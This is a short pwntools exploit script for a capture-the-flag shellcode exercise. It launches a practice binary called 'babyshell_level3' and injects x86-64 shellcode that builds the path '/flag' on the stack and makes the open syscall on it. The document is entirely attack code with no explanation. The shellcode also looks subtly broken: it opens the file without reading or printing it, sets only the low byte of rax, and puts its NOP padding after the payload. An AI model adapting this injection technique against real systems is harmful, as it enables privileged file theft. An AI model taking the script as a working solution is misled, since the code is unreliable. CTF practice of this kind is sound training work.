import pwn

shellcode = """
mov al, 2
xor edi, edi
push 0x67616c66
shl qword ptr [rsp], 8
mov byte ptr [rsp], 0x2f
mov rdi, rsp
xor esi, esi
xor edx, edx
syscall
"""

shellcode = shellcode + "nop\n" * (2034 - shellcode.count('\n'))

# Convert the assembly to bytes
shellcode = pwn.asm(shellcode)

# Start the target process
process = pwn.process('/challenge/babyshell_level3')

# Send the shellcode
process.send(shellcode)

# Interact with the process
process.interactive()

